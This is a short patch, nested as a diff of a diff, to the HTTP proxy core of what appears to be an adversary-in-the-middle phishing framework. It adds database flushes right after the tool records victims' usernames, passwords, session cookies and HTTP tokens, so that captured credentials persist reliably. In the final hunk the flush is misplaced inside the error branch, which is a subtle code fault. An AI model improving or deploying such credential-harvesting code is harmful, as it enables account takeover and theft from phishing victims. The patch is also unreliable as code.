@@ -1,0 +1,42 @@
+--- a/core/http_proxy.go
++++ b/core/http_proxy.go
+@@ -417,6 +417,7 @@ func (p *HttpProxy) handleRequest(req *http.Request) (bool, *http.Response) {
+ 				if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
+ 					log.Error("database: %v", err)
+ 				}
++				p.db.Flush()
+ 
+ 				session.RemoteAddr = remote_addr
+ 				session.UserAgent = req.Header.Get("User-Agent")
+@@ -684,6 +685,7 @@ func (p *HttpProxy) handleRequest(req *http.Request) (bool, *http.Response) {
+ 							if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+ 								log.Error("database: %v", err)
+ 							}
++							p.db.Flush()
+ 						}
+ 					}
+ 					
+@@ -695,6 +697,7 @@ func (p *HttpProxy) handleRequest(req *http.Request) (bool, *http.Response) {
+ 							if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+ 								log.Error("database: %v", err)
+ 							}
++							p.db.Flush()
+ 						}
+ 					}
+ 
+@@ -1055,6 +1058,7 @@ func (p *HttpProxy) handleRequest(req *http.Request) (bool, *http.Response) {
+ 					if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+ 						log.Error("database: %v", err)
+ 					}
++					p.db.Flush()
+ 					if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+ 						log.Error("database: %v", err)
+ 					}
+@@ -1196,6 +1200,7 @@ func (p *HttpProxy) handleRequest(req *http.Request) (bool, *http.Response) {
+ 					err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
+ 					if err != nil {
+ 						log.Error("database: %v", err)
++					p.db.Flush()
+ 					}
+ 				}
+ 			}
